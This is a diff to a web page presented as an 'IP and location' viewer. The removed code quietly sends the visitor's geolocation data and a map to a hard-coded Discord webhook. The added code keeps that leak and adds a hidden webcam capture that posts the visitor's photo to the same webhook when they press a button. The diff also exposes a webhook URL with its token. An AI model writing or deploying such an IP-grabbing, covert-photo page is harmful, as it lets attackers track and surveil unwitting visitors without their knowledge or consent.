@@ -8,7 +8,10 @@
 <body>
     <h2>Your IP and Location</h2>
     <pre id="output">Fetching...</pre>
-    <img id="map" src="" alt="Location Map" style="max-width: 100%; display: none;">
+    
+    <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <button id="captureBtn">Capture Photo</button>
 
     <script>
         async function fetchIPData() {
@@ -30,36 +33,59 @@
 
                 document.getElementById("output").innerText = JSON.stringify(details, null, 2);
 
-                // Generate a static map image URL
-                let mapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${details.lat},${details.lon}&zoom=12&size=600x400&markers=color:red%7C${details.lat},${details.lon}&key=YOUR_GOOGLE_MAPS_API_KEY`;
-
-                document.getElementById("map").src = mapUrl;
-                document.getElementById("map").style.display = "block";
-
-                // Send data and image to Discord
-                let webhookUrl = "https://discordapp.com/api/webhooks/1348733422851461170/Ejz-fNQrQFxtqQ_8Tq3EiVBLDz84omtzuLiDUNqaY53z1f80haoib3vFfFjWZfKQz2EK"; // Replace with your webhook
-
-                let webhookData = {
-                    content: `**New IP Logged**\n\`\`\`json\n${JSON.stringify(details, null, 2)}\n\`\`\``,
-                    embeds: [{
-                        title: "Location Map",
-                        image: { url: mapUrl }
-                    }]
-                };
-
-                fetch(webhookUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(webhookData)
-                });
+                return details;
 
             } catch (error) {
                 document.getElementById("output").innerText = "Error fetching data.";
                 console.error("Error:", error);
+                return null;
             }
         }
 
-        fetchIPData();
+        async function capturePhoto() {
+            let video = document.getElementById("video");
+            let canvas = document.getElementById("canvas");
+            let context = canvas.getContext("2d");
+
+            // Request access to the user's camera
+            let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+
+            // Wait for video to load
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+            // Set canvas size to match video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Draw frame from video
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Stop video stream
+            stream.getTracks().forEach(track => track.stop());
+
+            // Convert to image blob
+            return new Promise(resolve => canvas.toBlob(resolve, "image/png"));
+        }
+
+        async function sendToDiscord() {
+            let details = await fetchIPData();
+            if (!details) return;
+
+            let photoBlob = await capturePhoto();
+            let webhookUrl = "https://discordapp.com/api/webhooks/1348733422851461170/Ejz-fNQrQFxtqQ_8Tq3EiVBLDz84omtzuLiDUNqaY53z1f80haoib3vFfFjWZfKQz2EK"; // Replace with your webhook
+
+            let formData = new FormData();
+            formData.append("content", `**New IP Logged**\n\`\`\`json\n${JSON.stringify(details, null, 2)}\n\`\`\``);
+            formData.append("file", photoBlob, "photo.png");
+
+            fetch(webhookUrl, {
+                method: "POST",
+                body: formData
+            });
+        }
+
+        document.getElementById("captureBtn").addEventListener("click", sendToDiscord);
     </script>
 </body>
 </html>
